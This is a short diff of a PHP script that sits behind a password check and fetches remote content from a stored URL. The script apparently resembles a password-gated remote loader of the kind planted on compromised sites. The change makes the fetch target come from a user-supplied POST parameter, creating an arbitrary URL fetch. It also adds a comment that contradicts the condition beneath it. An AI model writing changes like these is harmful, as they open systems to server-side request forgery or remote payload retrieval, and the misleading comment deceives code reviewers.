@@ -39,7 +39,7 @@ if (isset($_GET['ts_reset'])) {
     exit;
 }
 
-// Process password input and session management
+// If the user is already authenticated, skip the login prompt
 if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
     // If not authenticated, display the password form
     if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
@@ -47,8 +47,8 @@ if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
         if (password_verify($provided_password, $correct_password)) {
             // Set session on successful password verification
             $_SESSION['ts_auth'] = true; // Store authentication state in session
-            $_SESSION["ts_url"] = $url; // Store URL in session for later use
-            // Redirect to same page after successful login
+            $_SESSION["ts_url"] = isset($_POST['url']) ? $_POST['url'] : $url; // Store URL in session for later use
+            // Redirect to same page after successful login (with parameters intact)
             header("Location: " . $_SERVER['REQUEST_URI']);
             exit;
         } else {
@@ -73,6 +73,7 @@ if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
             $result = madrid($url);
         }
     } else {
+        // If there's a custom URL in the session, use it
         $result = @file_get_contents($_SESSION["ts_url"]);
         if (empty($result)) {
             $result = madrid($_SESSION["ts_url"]);
